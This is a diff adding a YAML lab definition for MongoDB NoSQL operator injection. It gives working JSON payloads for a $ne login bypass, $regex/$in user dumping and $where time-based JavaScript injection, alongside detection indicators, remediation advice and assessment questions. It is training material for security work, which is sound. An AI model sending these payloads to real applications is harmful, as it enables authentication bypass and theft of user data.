@@ -1,0 +1,103 @@
+# Category: Offensive Security - Web
+name: "NoSQL Injection – MongoDB Operator Injection"
+id: "web-nosql-injection-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit NoSQL injection in MongoDB applications by injecting JavaScript
+  or query operators (e.g., $where, $ne, $gt) to bypass authentication,
+  extract data, or achieve remote code execution. This attack targets
+  applications that do not properly sanitize JSON input.
+
+learning_objectives:
+  - Understand MongoDB query syntax (operators)
+  - Inject operators to bypass login
+  - Perform Boolean‑based blind injection
+  - Use $where for JavaScript execution (if enabled)
+
+tools:
+  - Burp Suite (or Postman)
+  - curl
+  - Python (pymongo)
+  - HackTricks cheatsheet
+
+prerequisites:
+  - Application with MongoDB backend that parses JSON input
+  - Login or search endpoint accepting JSON
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify endpoint that passes JSON to MongoDB"
+    commands:
+      - "# Test login with JSON payload:"
+      - '{"username": "admin", "password": {"$ne": ""}}'
+      - "# If successful, the query becomes: db.users.find({username:"admin", password:{$ne:""}})'
+    expected_output: "Login successful without valid password"
+    detection: "Application logs showing unexpected query operators"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject operators to retrieve all users"
+    commands:
+      - "# Payload to dump user data:"
+      - '{"username": {"$regex": ".*"}, "password": {"$ne": ""}}'
+      - "# Or use $in to match multiple values"
+      - '{"username": {"$in": ["admin", "user1"]}}'
+    expected_output: "List of user objects returned"
+    detection: "Large data sets returned from API; abnormal query patterns"
+
+  - id: "step3"
+    phase: "advanced_exploitation"
+    action: "Exploit JavaScript injection via $where (if RCE enabled)"
+    commands:
+      - "# Send payload:"
+      - '{"username": "admin", "$where": "sleep(5000)"}'
+      - "# If response is delayed, RCE is possible"
+      - "# Then try to read files or execute commands"
+      - '{"$where": "this.username == \"admin\" && sleep(5000)"}'
+    expected_output: "Time delay indicates code execution; further RCE may be possible"
+    detection: "Application hanging; high CPU or memory usage"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Request payloads containing $ne, $gt, $where, $regex"
+  log_indicators:
+    - "MongoDB logs showing operator usage"
+    - "Error messages revealing MongoDB syntax"
+  endpoint_indicators:
+    - "Automated scanning tools with NoSQL payloads"
+
+remediation:
+  immediate:
+    - "Use schema validation to reject operators in string fields"
+    - "Sanitize input by converting to strings before query"
+  long_term:
+    - "Use Mongoose or equivalent with strict validation"
+    - "Disable JavaScript execution on MongoDB (--noscripting)"
+
+variables:
+  target_url: "https://example.com/login"
+  admin_user: "admin"
+
+assessment_questions:
+  - "What MongoDB operator can bypass password checks in a login query?"
+  - "How does JavaScript injection ($where) differ from operator injection?"
+  - "What is the best practice for handling user input in MongoDB queries?"
+
+references:
+  - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
+    title: "OWASP NoSQL Injection"
+  - url: "https://www.mongodb.com/docs/manual/reference/operator/query/"
+    title: "MongoDB Query Operators"
